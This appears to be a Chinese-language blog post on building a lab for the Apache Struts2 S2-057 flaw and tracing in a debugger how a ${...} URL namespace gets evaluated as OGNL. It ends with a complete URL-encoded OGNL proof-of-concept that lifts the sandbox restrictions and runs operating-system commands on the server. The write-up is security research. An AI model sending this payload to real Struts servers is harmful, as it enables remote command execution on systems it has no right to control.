@@ -1,0 +1,61 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="S2-057漏洞环境搭建与分析"><meta name="keywords" content="Java代码审计"><meta name="author" content="littlefisher,undefined"><meta name="copyright" content="littlefisher"><title>S2-057漏洞环境搭建与分析 | littlefisher</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css?version=1.5.4"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  localSearch: undefined
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞环境搭建"><span class="toc-number">1.</span> <span class="toc-text">漏洞环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击点1：Redirect-action"><span class="toc-number">2.1.</span> <span class="toc-text">攻击点1：Redirect action</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试Poc"><span class="toc-number">2.2.</span> <span class="toc-text">测试Poc</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">littlefisher</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">13</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">7</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(http://119.29.91.207/mianma.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">littlefisher</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span></div><div id="post-info"><div id="post-title">S2-057漏洞环境搭建与分析</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-10-14</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>因为学习了Java，所以就尝试着分析几个Struts2反序列化漏洞，首先分析的其实是S-045，再是S-057，后来经过前辈指点，就决定把S-045、S-046放在一起吧~。<br><a id="more"></a></p>
+<h1 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h1><p>1、Tomcat-9.0.26<br>2、Structs-2.5.16（影响Struts2版本： Struts 2.3– Struts 2.3.34, Struts 2.5 – Struts 2.5.16）<br>3、Win10系统</p>
+<p>修改struts-actionchaining.xml文件：</p>
+<p><img src="https://i.imgur.com/tCNJdM7.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;package name=&quot;actionchaining&quot; extends=&quot;struts-default&quot;&gt;</span><br><span class="line">		&lt;action name=&quot;actionChain1&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt;</span><br><span class="line">			&lt;result type=&quot;redirectAction&quot;&gt;</span><br><span class="line">				&lt;param name = &quot;actionName&quot;&gt;register3&lt;/param&gt;</span><br><span class="line">			&lt;/result&gt;</span><br><span class="line">		&lt;/action&gt;</span><br><span class="line">&lt;/package&gt;</span><br></pre></td></tr></table></figure>
+<p>漏洞环境搭建完毕后访问struts2_showcase_war/${(111+111)}/actionChain1.actionURL会变成struts2_showcase_war/222/register2.action。</p>
+<p>有些文章中还说要修改org/apache/struts2/default.properties文件中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struts.mapper.alwaysSelectFullNamespace=true</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/nL9OAty.png" alt=""></p>
+<p>我在测试时并没有将false（默认）改为true，URL也会如上述中改变。不知道这是啥情况噢~</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="攻击点1：Redirect-action"><a href="#攻击点1：Redirect-action" class="headerlink" title="攻击点1：Redirect action"></a>攻击点1：Redirect action</h2><p>由于strut2中处理默认result type都要经过 com/opensymphony/xwork2/DefaultActionInvocation.java处理：</p>
+<p><img src="https://i.imgur.com/HvdRRfs.png" alt=""></p>
+<p>上图中箭头所指的位置经测试发现是会赋3次值，跟入execute()后:</p>
+<p><img src="https://i.imgur.com/e4BnZ7V.png" alt=""></p>
+<p><img src="https://i.imgur.com/zfU1g5T.png" alt=""></p>
+<p>发现namespace为空，因此执行invocation.getProxy().getNamespace()，执行后对于result对象的namespace即为/${(111+111)}：</p>
+<p><img src="https://i.imgur.com/DBaQXnT.png" alt=""></p>
+<p>继续跟进，又执行execute中的操作：</p>
+<p><img src="https://i.imgur.com/R1o1uvR.png" alt=""></p>
+<p>继续跟进：</p>
+<p><img src="https://i.imgur.com/SmMSZLw.png" alt=""></p>
+<p>跟入ActionMapping(),在ActionMapping()生成如下，this.namespace赋值为/${(111+111)} :</p>
+<p><img src="https://i.imgur.com/nQqgN5L.png" alt=""></p>
+<p>然后跟入getUriFromActionMapping()：</p>
+<p><img src="https://i.imgur.com/zAiebmW.png" alt=""></p>
+<p>handleNamespace()处理结果如下：</p>
+<p><img src="https://i.imgur.com/yKUcd36.png" alt=""></p>
+<p>继续跟进，tmpLocation值为/${(111+111)}/register3.action：</p>
+<p><img src="https://i.imgur.com/FjdGxuP.png" alt=""></p>
+<p>跟入execute()后，注意不同文件的excute()：</p>
+<p><img src="https://i.imgur.com/5ywGACX.png" alt=""></p>
+<p>跟入excute():</p>
+<p><img src="https://i.imgur.com/UZX5zCC.png" alt=""></p>
+<p>分析还没变成222之前的conditionalParse()：</p>
+<p><img src="https://i.imgur.com/LPAIOAu.png" alt=""></p>
+<p>继续跟入translateVariables():</p>
+<p><img src="https://i.imgur.com/UVgN4lH.png" alt=""></p>
+<p>继续跟入上图中蓝色高光处的translateVariables()：</p>
+<p><img src="https://i.imgur.com/QgdFUsZ.png" alt=""></p>
+<p>继续跟入蓝色高光处后，再跟入evaluate()：</p>
+<p><img src="https://i.imgur.com/8l8ifmU.png" alt=""><br><img src="https://i.imgur.com/p20lj5S.png" alt=""></p>
+<p>经过遍历uri后，c=}结束遍历获取uri/${}中的值（111+111）：</p>
+<p><img src="https://i.imgur.com/gzFfbju.png" alt=""></p>
+<p>经过下一步后111+111就变成了222：</p>
+<p><img src="https://i.imgur.com/JrVHkrM.png" alt=""></p>
+<p>最后结果如下：</p>
+<p><img src="https://i.imgur.com/RAS6Lin.png" alt=""></p>
+<h2 id="测试Poc"><a href="#测试Poc" class="headerlink" title="测试Poc"></a>测试Poc</h2><p>以如下poc为例，发现经过Object o = evaluator.evaluate(var)后，直接弹出计算器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/struts2_showcase_war/%24%7B%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.setExcludedClasses%28%27java.lang.Shutdown%27%29%29.%28%23ou.setExcludedPackageNames%28%27sun.reflect.%27%29%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27calc.exe%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/actionChain1.action</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/xQpVKQn.png" alt=""></p>
+<p>已经隔了很多天才上传的，说实话分析步骤还记得，里面的函数不咋记得了~hhh。后续会将S-045\S-046再上传到博客上。</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">littlefisher</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2019/10/14/S2-045漏洞环境搭建与分析/">http://yoursite.com/2019/10/14/S2-045漏洞环境搭建与分析/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java代码审计/">Java代码审计</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/11/18/Oracle注入第一篇/"><i class="fa fa-chevron-left">  </i><span>Oracle注入第一篇：回显单引号字符型注入</span></a></div><div class="next-post pull-right"><a href="/2018/10/17/困/"><span>困到不想学习~应届生的小结</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By littlefisher</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.4"></script><script src="/js/fancybox.js?version=1.5.4"></script><script src="/js/sidebar.js?version=1.5.4"></script><script src="/js/copy.js?version=1.5.4"></script><script src="/js/fireworks.js?version=1.5.4"></script><script src="/js/transition.js?version=1.5.4"></script><script src="/js/scroll.js?version=1.5.4"></script><script src="/js/head.js?version=1.5.4"></script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"z16","width":150,"height":300,"scaling":1,"opacityDefault":0.7,"opacityHover":1,"mobileShow":true,"mobileScaling":0.5,"position":"right","horizontalOffset":0,"verticalOffset":-20,"id":"live2dcanvas","deviceJsSource":"local","pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/"});</script></body></html>
